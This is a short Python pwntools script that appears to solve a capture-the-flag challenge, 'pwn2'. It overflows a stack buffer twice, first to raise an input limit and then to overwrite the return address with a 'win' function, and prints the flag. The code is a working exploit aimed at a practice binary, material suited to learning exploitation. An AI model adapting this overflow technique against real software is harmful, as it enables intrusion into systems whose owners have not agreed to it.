#!/usr/bin/env python3
from pwn import remote, args,  process, ELF, p64, p32

if args.REMOTE:
    r = remote('localhost', 69420) #Change host and port
else:
    r = process("./pwn2")

elf = ELF("./pwn2")

# Overwriting limit
r.recvuntil(b':')
r.sendline(b'a' * 76 + p32(96))

# Sending right choice
r.recvuntil(b'stuff')
r.sendline(b'69')

#Overwriting return address
r.recvuntil(b'it.')
r.sendline(b'a'*88 + p64(elf.sym['win']))
r.recvuntil(b'Bye!\n')

#Flag!
print(r.recvline().decode())